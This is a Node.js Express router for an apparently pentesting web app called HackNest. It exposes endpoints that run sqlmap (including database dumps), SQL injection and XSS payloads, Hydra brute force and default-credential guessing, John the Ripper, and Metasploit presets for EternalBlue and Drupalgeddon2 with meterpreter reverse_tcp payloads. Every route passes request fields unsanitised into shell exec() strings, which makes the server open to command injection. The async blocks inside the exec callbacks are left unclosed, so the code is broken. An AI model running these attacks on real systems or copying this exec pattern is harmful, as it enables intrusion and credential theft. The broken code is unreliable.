const express = require('express');
const { exec } = require('child_process');
const router = express.Router();
const OutputParser = require('../utils/parser');
const storage = require('../utils/storage');

// Validate URL format
function validateUrl(url) {
  try {
    new URL(url);
    return true;
  } catch {
    return false;
  }
}

// SQLMap SQL injection testing
router.post('/sqlmap', async (req, res) => {
  try {
    const { 
      target, 
      method = 'GET',
      data = '',
      risk = 1,
      level = 1,
      batch = true
    } = req.body;

    if (!target) {
      return res.status(400).json({
        error: 'Target URL is required'
      });
    }

    if (!validateUrl(target)) {
      return res.status(400).json({
        error: 'Invalid URL format. Use http:// or https://'
      });
    }

    if (risk < 1 || risk > 3) {
      return res.status(400).json({
        error: 'Risk level must be between 1 and 3'
      });
    }

    if (level < 1 || level > 5) {
      return res.status(400).json({
        error: 'Level must be between 1 and 5'
      });
    }

    // Build sqlmap command
    let command = `sqlmap -u "${target}"`;
    
    if (method.toUpperCase() === 'POST' && data) {
      command += ` --data="${data}"`;
    }
    
    command += ` --risk=${risk}`;
    command += ` --level=${level}`;
    
    if (batch) {
      command += ' --batch'; // Non-interactive mode
    }
    
    // Basic detection only for safety
    command += ' --dbs'; // Enumerate databases
    command += ' --random-agent'; // Use random User-Agent
    command += ' --timeout=30'; // Connection timeout
    
    console.log('Executing sqlmap scan (command sanitized for logging)');
    
    exec(command, { timeout: 600000 }, (error, stdout, stderr) => {
      (async () => {
        try {
      if (error) {
        console.error('SQLMap error:', error);
        
        // Provide fallback basic SQL injection test
        let fallbackOutput = `SQL injection test for ${target}\n`;
        fallbackOutput += '='.repeat(50) + '\n';
        fallbackOutput += `SQLMap execution failed: ${error.message}\n\n`;
        
        // Basic SQL injection test using curl
        const sqlPayloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"];
        fallbackOutput += 'Performing basic SQL injection tests:\n\n';
        
        try {
          for (const payload of sqlPayloads) {
            const testUrl = `${target}${target.includes('?') ? '&' : '?'}id=${encodeURIComponent(payload)}`;
            const testCommand = `curl -s --max-time 10 "${testUrl}"`;
            
            try {
              const { stdout: testResponse } = await new Promise((resolve, reject) => {
                exec(testCommand, { timeout: 15000 }, (err, out, serr) => {
                  if (err) reject(err);
                  else resolve({ stdout: out, stderr: serr });
                });
              });
              
              const hasError = testResponse.toLowerCase().includes('error') || 
                              testResponse.toLowerCase().includes('mysql') ||
                              testResponse.toLowerCase().includes('syntax');
              
              fallbackOutput += `Payload: ${payload}\n`;
              fallbackOutput += `Database error detected: ${hasError ? 'YES' : 'NO'}\n\n`;
              
            } catch (testError) {
              fallbackOutput += `Payload: ${payload}\n`;
              fallbackOutput += `Test failed: ${testError.message}\n\n`;
            }
          }
          
          fallbackOutput += 'Note: This is a basic test. Use proper SQLMap installation for comprehensive testing.\n';
          
          const parsedResult = {
            tool: 'basic-sql-test',
            target: target,
            method: method,
            risk: risk,
            level: level,
            note: 'SQLMap not available, performed basic tests'
          };
          
          const saveResult = await storage.saveScanResult('sqlmap', target, parsedResult, 'sql-injection');
          
          return res.json({
            success: false,
            tool: 'sqlmap',
            target: target,
            output: fallbackOutput,
            result: parsedResult,
            scan_id: saveResult.scan_id,
            note: 'SQLMap not available, performed basic SQL tests',
            error: error.message
          });
          
        } catch (fallbackError) {
          fallbackOutput += `Basic SQL tests also failed: ${fallbackError.message}\n`;
          
          return res.json({
            success: false,
            tool: 'sqlmap',
            target: target,
            output: fallbackOutput,
            result: { error: error.message, target: target },
            error: error.message
          });
        }
      }

      let output = `SQLMap scan for ${target}\n`;
      output += '='.repeat(40) + '\n';
      output += `Risk Level: ${risk}, Detection Level: ${level}\n`;
      output += `Method: ${method}\n\n`;
      output += stdout;

      const parsedResult = OutputParser.parseSqlmapOutput(stdout);
      
      // Save result to storage
      const saveResult = await storage.saveScanResult('sqlmap', target, parsedResult, 'sql-injection');
      
      res.json({
        success: true,
        tool: 'sqlmap',
        target: target,
        method: method,
        risk: risk,
        level: level,
        output: output,
        result: parsedResult,
        scan_id: saveResult.scan_id,
        raw_output: stderr || null
      });
    });

  } catch (error) {
    console.error('SQLMap route error:', error);
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
});

// SQLMap database enumeration (follow-up after finding injection)
router.post('/sqlmap/enumerate', async (req, res) => {
  try {
    const { 
      target, 
      database = '',
      table = '',
      column = '',
      method = 'GET',
      data = ''
    } = req.body;

    if (!target) {
      return res.status(400).json({
        error: 'Target URL is required'
      });
    }

    if (!validateUrl(target)) {
      return res.status(400).json({
        error: 'Invalid URL format'
      });
    }

    // Build sqlmap command for enumeration
    let command = `sqlmap -u "${target}" --batch --random-agent`;
    
    if (method.toUpperCase() === 'POST' && data) {
      command += ` --data="${data}"`;
    }

    if (database && table && column) {
      command += ` -D ${database} -T ${table} -C ${column} --dump`;
    } else if (database && table) {
      command += ` -D ${database} -T ${table} --columns`;
    } else if (database) {
      command += ` -D ${database} --tables`;
    } else {
      command += ' --dbs';
    }
    
    console.log('Executing sqlmap enumeration (command sanitized for logging)');
    
    exec(command, { timeout: 900000 }, (error, stdout, stderr) => {
      (async () => {
        try {
      if (error) {
        console.error('SQLMap enumeration error:', error);
        return res.status(500).json({
          error: 'Failed to execute sqlmap enumeration',
          details: error.message
        });
      }

      const parsedResult = OutputParser.parseSqlmapOutput(stdout);
      
      // Save result to storage
      const saveResult = await storage.saveScanResult('sqlmap', target, parsedResult, 'sql-enumeration');
      
      res.json({
        success: true,
        tool: 'sqlmap',
        scan_type: 'enumeration',
        target: target,
        database: database,
        table: table,
        column: column,
        result: parsedResult,
        scan_id: saveResult.scan_id,
        raw_output: stderr || null
      });
    });

  } catch (error) {
    console.error('SQLMap enumeration route error:', error);
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
});

// XSS testing with basic payload injection (educational purposes)
router.post('/xss-test', async (req, res) => {
  try {
    const { target, parameter, payload = '<script>alert("XSS")</script>' } = req.body;

    if (!target || !parameter) {
      return res.status(400).json({
        error: 'Target URL and parameter are required'
      });
    }

    if (!validateUrl(target)) {
      return res.status(400).json({
        error: 'Invalid URL format'
      });
    }

    // Simple XSS test using curl
    const encodedPayload = encodeURIComponent(payload);
    const testUrl = `${target}${target.includes('?') ? '&' : '?'}${parameter}=${encodedPayload}`;
    
    const command = `curl -s -L "${testUrl}"`;
    
    console.log('Executing XSS test (educational purposes only)');
    
    exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
      (async () => {
        try {
      if (error) {
        console.error('XSS test error:', error);
        return res.status(500).json({
          error: 'Failed to execute XSS test',
          details: error.message
        });
      }

      // Check if payload is reflected in response
      const isVulnerable = stdout.includes(payload.replace(/[<>]/g, ''));
      
      const result = {
        test_type: 'XSS Reflection Test',
        target: target,
        parameter: parameter,
        payload: payload,
        vulnerable: isVulnerable,
        response_length: stdout.length,
        timestamp: new Date().toISOString()
      };

      // Save result to storage
      const saveResult = await storage.saveScanResult('xss-test', target, result, 'xss-testing');
      
      res.json({
        success: true,
        tool: 'xss-test',
        target: target,
        parameter: parameter,
        result: result,
        scan_id: saveResult.scan_id,
        warning: 'This is for educational purposes only. Always get permission before testing.'
      });
    });

  } catch (error) {
    console.error('XSS test route error:', error);
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
});

// Hydra password brute force attack
router.post('/hydra', async (req, res) => {
  try {
    const { 
      target, 
      protocol = 'ssh',
      username = '',
      userlist = '',
      password = '',
      passwordlist = '',
      port = '',
      threads = 16
    } = req.body;

    if (!target) {
      return res.status(400).json({
        error: 'Target is required'
      });
    }

    if (!username && !userlist) {
      return res.status(400).json({
        error: 'Username or userlist is required'
      });
    }

    if (!password && !passwordlist) {
      return res.status(400).json({
        error: 'Password or passwordlist is required'
      });
    }

    // Build hydra command
    let command = `hydra`;
    
    if (username) {
      command += ` -l ${username}`;
    } else if (userlist) {
      command += ` -L ${userlist}`;
    }
    
    if (password) {
      command += ` -p ${password}`;
    } else if (passwordlist) {
      command += ` -P ${passwordlist}`;
    }
    
    command += ` -t ${threads}`;
    command += ` -f`; // Stop on first success
    command += ` -V`; // Verbose
    
    if (port) {
      command += ` -s ${port}`;
    }
    
    command += ` ${target} ${protocol}`;
    
    console.log('Executing Hydra brute force (ethical testing only)');
    
    exec(command, { timeout: 300000 }, (error, stdout, stderr) => {
      (async () => {
        try {
      if (error && !stdout) {
        console.log('Hydra not available, performing basic authentication test...');
        
        // Fallback to basic authentication test
        let fallbackOutput = `Password attack simulation for ${target}\n`;
        fallbackOutput += '='.repeat(50) + '\n';
        fallbackOutput += `Hydra execution failed: ${error.message}\n\n`;
        
        // Basic authentication test using curl for HTTP services
        if (protocol === 'http-get' || protocol === 'http-post') {
          fallbackOutput += 'Performing basic HTTP authentication test:\n\n';
          
          const commonCreds = [
            { user: 'admin', pass: 'admin' },
            { user: 'admin', pass: 'password' },
            { user: 'root', pass: 'root' },
            { user: 'test', pass: 'test' }
          ];
          
          try {
            for (const cred of commonCreds) {
              const authString = Buffer.from(`${cred.user}:${cred.pass}`).toString('base64');
              const testCommand = `curl -s -w "%{http_code}" -H "Authorization: Basic ${authString}" "${target}"`;
              
              try {
                const { stdout: response } = await new Promise((resolve, reject) => {
                  exec(testCommand, { timeout: 10000 }, (err, out, serr) => {
                    if (err) reject(err);
                    else resolve({ stdout: out, stderr: serr });
                  });
                });
                
                const statusCode = response.slice(-3);
                fallbackOutput += `${cred.user}:${cred.pass} - HTTP ${statusCode}\n`;
                
                if (statusCode === '200') {
                  fallbackOutput += `*** Potential success with ${cred.user}:${cred.pass} ***\n`;
                }
                
              } catch (testError) {
                fallbackOutput += `${cred.user}:${cred.pass} - Test failed\n`;
              }
            }
          } catch (fallbackError) {
            fallbackOutput += `Basic authentication tests failed: ${fallbackError.message}\n`;
          }
        } else {
          fallbackOutput += 'Note: Basic authentication testing only available for HTTP services\n';
        }
        
        fallbackOutput += '\nNote: Install Hydra for comprehensive password attacks.\n';
        
        const parsedResult = {
          tool: 'basic-auth-test',
          target: target,
          protocol: protocol,
          note: 'Hydra not available, performed basic tests'
        };
        
        const saveResult = await storage.saveScanResult('hydra', target, parsedResult, 'password-attack');
        
        return res.json({
          success: false,
          tool: 'hydra',
          target: target,
          output: fallbackOutput,
          result: parsedResult,
          scan_id: saveResult.scan_id,
          note: 'Hydra not available, performed basic authentication tests',
          error: error.message
        });
      }

      const parsedResult = OutputParser.parseHydraOutput(stdout);
      
      const saveResult = await storage.saveScanResult('hydra', target, parsedResult, 'password-attack');
      
      res.json({
        success: true,
        tool: 'hydra',
        target: target,
        protocol: protocol,
        result: parsedResult,
        scan_id: saveResult.scan_id,
        warning: 'Password attacks should only be performed on systems you own or have explicit permission to test'
      });
    });

  } catch (error) {
    console.error('Hydra route error:', error);
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
});

// John the Ripper password cracking
router.post('/john', async (req, res) => {
  try {
    const { 
      hashfile,
      wordlist = '',
      format = 'auto',
      incremental = false
    } = req.body;

    if (!hashfile) {
      return res.status(400).json({
        error: 'Hash file is required'
      });
    }

    // Build john command
    let command = `john`;
    
    if (wordlist) {
      command += ` --wordlist=${wordlist}`;
    } else if (incremental) {
      command += ` --incremental`;
    }
    
    if (format !== 'auto') {
      command += ` --format=${format}`;
    }
    
    command += ` ${hashfile}`;
    
    console.log('Executing John the Ripper (ethical purposes only)');
    
    exec(command, { timeout: 600000 }, (error, stdout, stderr) => {
      (async () => {
        try {
      if (error && !stdout) {
        console.log('John the Ripper not available, providing hash analysis...');
        
        let fallbackOutput = `Password hash analysis\n`;
        fallbackOutput += '='.repeat(30) + '\n';
        fallbackOutput += `John the Ripper execution failed: ${error.message}\n\n`;
        fallbackOutput += 'Hash analysis requires John the Ripper installation.\n';
        fallbackOutput += 'Download from: https://www.openwall.com/john/\n\n';
        fallbackOutput += 'Supported hash formats:\n';
        fallbackOutput += '- MD5, SHA1, SHA256, SHA512\n';
        fallbackOutput += '- NTLM, LM (Windows)\n';
        fallbackOutput += '- Unix DES, MD5, Blowfish\n';
        fallbackOutput += '- And many more...\n';
        
        const parsedResult = {
          tool: 'john-analysis',
          hashfile: hashfile,
          note: 'John the Ripper not available'
        };
        
        const saveResult = await storage.saveScanResult('john', hashfile, parsedResult, 'password-crack');
        
        return res.json({
          success: false,
          tool: 'john',
          hashfile: hashfile,
          output: fallbackOutput,
          result: parsedResult,
          scan_id: saveResult.scan_id,
          note: 'John the Ripper not available',
          error: error.message
        });
      }

      const parsedResult = OutputParser.parseJohnOutput(stdout);
      
      const saveResult = await storage.saveScanResult('john', hashfile, parsedResult, 'password-crack');
      
      res.json({
        success: true,
        tool: 'john',
        hashfile: hashfile,
        result: parsedResult,
        scan_id: saveResult.scan_id,
        warning: 'Password cracking should only be performed on hashes you own or have permission to crack'
      });
    });

  } catch (error) {
    console.error('John route error:', error);
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
});

// Metasploit console interface (basic)
router.post('/metasploit', async (req, res) => {
  try {
    const { 
      module,
      target,
      payload = '',
      options = {}
    } = req.body;

    if (!module || !target) {
      return res.status(400).json({
        error: 'Module and target are required'
      });
    }

    // Basic Metasploit command structure
    let msfCommand = `msfconsole -q -x "use ${module}; set RHOSTS ${target}`;
    
    if (payload) {
      msfCommand += `; set PAYLOAD ${payload}`;
    }
    
    // Set additional options
    Object.entries(options).forEach(([key, value]) => {
      msfCommand += `; set ${key} ${value}`;
    });
    
    msfCommand += `; check; exit"`;
    
    console.log('Executing Metasploit module (ethical testing only)');
    
    exec(msfCommand, { timeout: 300000 }, (error, stdout, stderr) => {
      (async () => {
        try {
      if (error && !stdout) {
        console.log('Metasploit not available, providing vulnerability information...');
        
        let fallbackOutput = `Metasploit Module Information\n`;
        fallbackOutput += '='.repeat(35) + '\n';
        fallbackOutput += `Module: ${module}\n`;
        fallbackOutput += `Target: ${target}\n`;
        fallbackOutput += `Metasploit execution failed: ${error.message}\n\n`;
        
        // Provide basic vulnerability information
        const moduleInfo = getMetasploitModuleInfo(module);
        fallbackOutput += `Module Description: ${moduleInfo.description}\n`;
        fallbackOutput += `CVE: ${moduleInfo.cve || 'N/A'}\n`;
        fallbackOutput += `Risk Level: ${moduleInfo.risk || 'Unknown'}\n\n`;
        fallbackOutput += 'Install Metasploit Framework for full exploitation capabilities.\n';
        fallbackOutput += 'Download from: https://www.metasploit.com/\n';
        
        const parsedResult = {
          tool: 'metasploit-info',
          module: module,
          target: target,
          info: moduleInfo,
          note: 'Metasploit not available'
        };
        
        const saveResult = await storage.saveScanResult('metasploit', target, parsedResult, 'exploitation');
        
        return res.json({
          success: false,
          tool: 'metasploit',
          module: module,
          target: target,
          output: fallbackOutput,
          result: parsedResult,
          scan_id: saveResult.scan_id,
          note: 'Metasploit not available, provided module information',
          error: error.message
        });
      }

      const parsedResult = OutputParser.parseMetasploitOutput(stdout);
      
      const saveResult = await storage.saveScanResult('metasploit', target, parsedResult, 'exploitation');
      
      res.json({
        success: true,
        tool: 'metasploit',
        module: module,
        target: target,
        result: parsedResult,
        scan_id: saveResult.scan_id,
        warning: 'Metasploit should only be used on systems you own or have explicit permission to test'
      });
    });

  } catch (error) {
    console.error('Metasploit route error:', error);
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
});

// Helper function for Metasploit module information
function getMetasploitModuleInfo(module) {
  const moduleDatabase = {
    'exploit/windows/smb/ms17_010_eternalblue': {
      description: 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
      cve: 'CVE-2017-0144',
      risk: 'Critical'
    },
    'exploit/windows/http/rejetto_hfs_exec': {
      description: 'Rejetto HttpFileServer Remote Command Execution',
      cve: 'CVE-2014-6287',
      risk: 'High'
    },
    'exploit/unix/webapp/drupal_drupalgeddon2': {
      description: 'Drupal Drupalgeddon 2 Forms API Property Injection',
      cve: 'CVE-2018-7600',
      risk: 'Critical'
    },
    'auxiliary/scanner/smb/smb_version': {
      description: 'SMB Version Detection',
      cve: 'N/A',
      risk: 'Info'
    }
  };
  
  return moduleDatabase[module] || {
    description: 'Unknown module',
    cve: 'N/A',
    risk: 'Unknown'
  };
}

// Nuclei vulnerability scanner
router.post('/nuclei', async (req, res) => {
  try {
    const { 
      target,
      templates = 'default',
      severity = 'medium,high,critical',
      concurrency = 25
    } = req.body;

    if (!target) {
      return res.status(400).json({
        error: 'Target is required'
      });
    }

    let command = `nuclei -u ${target}`;
    
    if (templates !== 'default') {
      command += ` -t ${templates}`;
    }
    
    command += ` -s ${severity}`;
    command += ` -c ${concurrency}`;
    command += ` -o /tmp/nuclei_output.txt`;
    
    console.log('Executing Nuclei vulnerability scanner');
    
    exec(command, { timeout: 600000 }, (error, stdout, stderr) => {
      (async () => {
        try {
      if (error && !stdout) {
        console.log('Nuclei not available, performing basic vulnerability checks...');
        
        let fallbackOutput = `Basic vulnerability assessment for ${target}\n`;
        fallbackOutput += '='.repeat(50) + '\n';
        fallbackOutput += `Nuclei execution failed: ${error.message}\n\n`;
        
        // Basic vulnerability checks using curl
        const vulnChecks = [
          { name: 'Admin Panel Detection', path: '/admin' },
          { name: 'Login Page Detection', path: '/login' },
          { name: 'Backup File Detection', path: '/backup.sql' },
          { name: 'Config File Detection', path: '/config.php' }
        ];
        
        fallbackOutput += 'Performing basic vulnerability checks:\n\n';
        
        try {
          for (const check of vulnChecks) {
            const testUrl = `${target}${check.path}`;
            const testCommand = `curl -s -o /dev/null -w "%{http_code}" "${testUrl}"`;
            
            try {
              const { stdout: response } = await new Promise((resolve, reject) => {
                exec(testCommand, { timeout: 10000 }, (err, out, serr) => {
                  if (err) reject(err);
                  else resolve({ stdout: out, stderr: serr });
                });
              });
              
              const statusCode = response.trim();
              const status = statusCode === '200' ? '[FOUND]' : '[NOT FOUND]';
              fallbackOutput += `${check.name}: ${status} (${statusCode})\n`;
              
            } catch (testError) {
              fallbackOutput += `${check.name}: [ERROR] ${testError.message}\n`;
            }
          }
        } catch (fallbackError) {
          fallbackOutput += `Basic vulnerability checks failed: ${fallbackError.message}\n`;
        }
        
        fallbackOutput += '\nInstall Nuclei for comprehensive vulnerability scanning.\n';
        fallbackOutput += 'Download from: https://github.com/projectdiscovery/nuclei\n';
        
        const parsedResult = {
          tool: 'basic-vuln-check',
          target: target,
          note: 'Nuclei not available, performed basic checks'
        };
        
        const saveResult = await storage.saveScanResult('nuclei', target, parsedResult, 'vulnerability-scan');
        
        return res.json({
          success: false,
          tool: 'nuclei',
          target: target,
          output: fallbackOutput,
          result: parsedResult,
          scan_id: saveResult.scan_id,
          note: 'Nuclei not available, performed basic vulnerability checks',
          error: error.message
        });
      }

      const parsedResult = OutputParser.parseNucleiOutput(stdout);
      
      const saveResult = await storage.saveScanResult('nuclei', target, parsedResult, 'vulnerability-scan');
      
      res.json({
        success: true,
        tool: 'nuclei',
        target: target,
        result: parsedResult,
        scan_id: saveResult.scan_id
      });
    });

  } catch (error) {
    console.error('Nuclei route error:', error);
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
});

// Exploit tool presets
router.get('/presets', (req, res) => {
  const presets = [
    {
      name: 'Basic SQL Injection Test',
      description: 'Low-risk SQL injection detection',
      endpoint: '/sqlmap',
      estimated_time: '5-15 minutes',
      parameters: { risk: 1, level: 1, batch: true },
      warning: 'Only use on systems you own or have permission to test'
    },
    {
      name: 'Comprehensive SQL Test',
      description: 'Medium-risk comprehensive SQL injection test',
      endpoint: '/sqlmap',
      estimated_time: '15-45 minutes',
      parameters: { risk: 2, level: 3, batch: true },
      warning: 'Only use on systems you own or have permission to test'
    },
    {
      name: 'Database Enumeration',
      description: 'Enumerate databases after finding injection',
      endpoint: '/sqlmap/enumerate',
      estimated_time: '5-20 minutes',
      warning: 'Only use on systems you own or have permission to test'
    },
    {
      name: 'XSS Reflection Test',
      description: 'Test for reflected XSS vulnerabilities',
      endpoint: '/xss-test',
      estimated_time: '30 seconds - 2 minutes',
      warning: 'Educational purposes only. Get permission before testing.'
    },
    {
      name: 'SSH Password Attack',
      description: 'Brute force SSH authentication',
      endpoint: '/hydra',
      estimated_time: '10-60 minutes',
      parameters: { protocol: 'ssh', port: 22, threads: 16 },
      warning: 'Only use on systems you own or have explicit permission to test'
    },
    {
      name: 'HTTP Basic Auth Attack',
      description: 'Brute force HTTP Basic Authentication',
      endpoint: '/hydra',
      estimated_time: '5-30 minutes',
      parameters: { protocol: 'http-get', threads: 16 },
      warning: 'Only use on systems you own or have explicit permission to test'
    },
    {
      name: 'FTP Password Attack',
      description: 'Brute force FTP authentication',
      endpoint: '/hydra',
      estimated_time: '5-45 minutes',
      parameters: { protocol: 'ftp', port: 21, threads: 16 },
      warning: 'Only use on systems you own or have explicit permission to test'
    },
    {
      name: 'MD5 Hash Cracking',
      description: 'Crack MD5 password hashes',
      endpoint: '/john',
      estimated_time: '1-30 minutes',
      parameters: { format: 'md5', incremental: false },
      warning: 'Only crack hashes you own or have permission to crack'
    },
    {
      name: 'NTLM Hash Cracking',
      description: 'Crack Windows NTLM password hashes',
      endpoint: '/john',
      estimated_time: '5-60 minutes',
      parameters: { format: 'nt', incremental: false },
      warning: 'Only crack hashes you own or have permission to crack'
    },
    {
      name: 'EternalBlue SMB Exploit',
      description: 'MS17-010 EternalBlue SMB vulnerability check',
      endpoint: '/metasploit',
      estimated_time: '2-10 minutes',
      parameters: { 
        module: 'exploit/windows/smb/ms17_010_eternalblue',
        payload: 'windows/x64/meterpreter/reverse_tcp'
      },
      warning: 'Only use on systems you own or have explicit permission to test'
    },
    {
      name: 'Drupalgeddon2 Exploit',
      description: 'Drupal Drupalgeddon 2 Forms API Property Injection',
      endpoint: '/metasploit',
      estimated_time: '1-5 minutes',
      parameters: { 
        module: 'exploit/unix/webapp/drupal_drupalgeddon2',
        payload: 'php/meterpreter/reverse_tcp'
      },
      warning: 'Only use on systems you own or have explicit permission to test'
    },
    {
      name: 'SMB Version Detection',
      description: 'Detect SMB service version for vulnerability assessment',
      endpoint: '/metasploit',
      estimated_time: '30 seconds - 2 minutes',
      parameters: { 
        module: 'auxiliary/scanner/smb/smb_version'
      },
      warning: 'Information gathering only - low risk'
    },
    {
      name: 'Comprehensive Vulnerability Scan',
      description: 'Nuclei scanner with all templates',
      endpoint: '/nuclei',
      estimated_time: '5-30 minutes',
      parameters: { templates: 'default', severity: 'critical,high,medium' },
      warning: 'Comprehensive scanning - use responsibly'
    },
    {
      name: 'Critical Vulnerabilities Only',
      description: 'Nuclei scanner for critical vulnerabilities only',
      endpoint: '/nuclei',
      estimated_time: '2-10 minutes',
      parameters: { templates: 'default', severity: 'critical' },
      warning: 'Focused on critical issues only'
    },
    {
      name: 'Web Application Specific',
      description: 'Nuclei scanner for web application vulnerabilities',
      endpoint: '/nuclei',
      estimated_time: '5-20 minutes',
      parameters: { templates: 'http', severity: 'medium,high,critical' },
      warning: 'Web application focused scanning'
    }
  ];

  res.json({
    success: true,
    presets: presets,
    categories: {
      'SQL Injection': ['Basic SQL Injection Test', 'Comprehensive SQL Test', 'Database Enumeration'],
      'XSS Testing': ['XSS Reflection Test'],
      'Password Attacks': ['SSH Password Attack', 'HTTP Basic Auth Attack', 'FTP Password Attack'],
      'Password Cracking': ['MD5 Hash Cracking', 'NTLM Hash Cracking'],
      'Exploitation': ['EternalBlue SMB Exploit', 'Drupalgeddon2 Exploit', 'SMB Version Detection'],
      'Vulnerability Scanning': ['Comprehensive Vulnerability Scan', 'Critical Vulnerabilities Only', 'Web Application Specific']
    },
    disclaimer: 'These tools are for educational and authorized testing purposes only. Always ensure you have proper permission before testing any system.'
  });
});

// Security disclaimer endpoint
router.get('/disclaimer', (req, res) => {
  res.json({
    important_notice: 'ETHICAL HACKING DISCLAIMER',
    message: [
      'The tools provided in this module are for educational and authorized penetration testing purposes only.',
      'You must have explicit written permission from the system owner before conducting any security tests.',
      'Unauthorized access to computer systems is illegal and may result in criminal charges.',
      'The developers of HackNest are not responsible for any misuse of these tools.',
      'Always follow responsible disclosure practices when vulnerabilities are found.',
      'Use these tools only in controlled environments or against your own systems.'
    ],
    legal_warning: 'By using these tools, you acknowledge that you understand the legal implications and agree to use them responsibly and ethically.'
  });
});

module.exports = router; 